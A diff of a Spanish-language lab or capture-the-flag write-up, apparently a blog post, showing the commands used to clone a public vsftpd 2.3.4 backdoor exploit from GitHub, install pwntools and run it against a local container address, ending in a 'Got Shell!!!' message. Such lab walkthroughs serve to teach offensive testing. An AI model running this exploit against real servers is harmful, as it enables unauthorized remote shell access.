@@ -79,7 +79,9 @@ Shellcodes: No Results
 De esta manera, buscamos en github exploits para esta vulnerabilidad, y nos encontramos con este repositori, nos lo descargamos y lo ejecutamos (https://github.com/Hellsender01/vsftpd_2.3.4_Exploit).
 
 ```
+❯ cd exploits
 ❯ git clone https://github.com/Hellsender01/vsftpd_2.3.4_Exploit.git
+❯ cd vsftpd_2.3.4_Exploit
 ❯ sudo python3 -m pip install pwntools
 ❯ python3 exploit.py 172.17.0.2
 [+] Got Shell!!!
